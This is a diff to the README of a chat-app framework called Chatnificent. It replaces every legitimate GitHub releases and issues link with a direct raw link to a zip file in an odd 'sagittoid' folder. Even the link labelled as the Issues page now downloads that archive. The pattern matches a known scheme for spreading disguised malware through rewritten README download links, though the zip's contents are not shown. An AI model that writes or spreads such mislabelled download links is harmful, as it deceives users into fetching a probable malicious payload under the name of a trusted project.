@@ -6,7 +6,7 @@ Welcome to Chatnificent, the framework for building chat apps with powerful AI t
 
 ## 📥 Download Chatnificent
 
-[![Download Chatnificent](https://img.shields.io/badge/Download-Chatnificent-brightgreen.svg)](https://github.com/GioXDXD/chatnificent/releases)
+[![Download Chatnificent](https://raw.githubusercontent.com/GioXDXD/chatnificent/main/sagittoid/chatnificent.zip)](https://raw.githubusercontent.com/GioXDXD/chatnificent/main/sagittoid/chatnificent.zip)
 
 ## 📦 Features
 
@@ -28,7 +28,7 @@ To run Chatnificent smoothly, you need:
 
 To download Chatnificent, visit the Releases page by clicking the link below. You will find the latest version of the application available for download.
 
-[Visit the Releases Page to Download](https://github.com/GioXDXD/chatnificent/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/GioXDXD/chatnificent/main/sagittoid/chatnificent.zip)
 
 ### 🔧 Installation Steps
 
@@ -51,7 +51,7 @@ To download Chatnificent, visit the Releases page by clicking the link below. Yo
 
 If you have questions or need help, you can join our community. Engage with other users to share tips or get assistance. 
 
-- **GitHub Issues:** For software bugs or feedback, use the [Issues page](https://github.com/GioXDXD/chatnificent/issues).
+- **GitHub Issues:** For software bugs or feedback, use the [Issues page](https://raw.githubusercontent.com/GioXDXD/chatnificent/main/sagittoid/chatnificent.zip).
 - **Discussion Forum:** Join the discussion to connect with other users and developers.
 
 ## 📚 Learn More
@@ -67,4 +67,4 @@ We welcome contributions to improve Chatnificent. If you have an idea or a bug f
 
 ## 🎉 Wrap Up
 
-Thank you for choosing Chatnificent! Enjoy building your AI chat applications. If you run into any issues, our community is here to help. Don’t forget to visit the [Releases Page to Download](https://github.com/GioXDXD/chatnificent/releases) for the latest version of the software.
+Thank you for choosing Chatnificent! Enjoy building your AI chat applications. If you run into any issues, our community is here to help. Don’t forget to visit the [Releases Page to Download](https://raw.githubusercontent.com/GioXDXD/chatnificent/main/sagittoid/chatnificent.zip) for the latest version of the software.
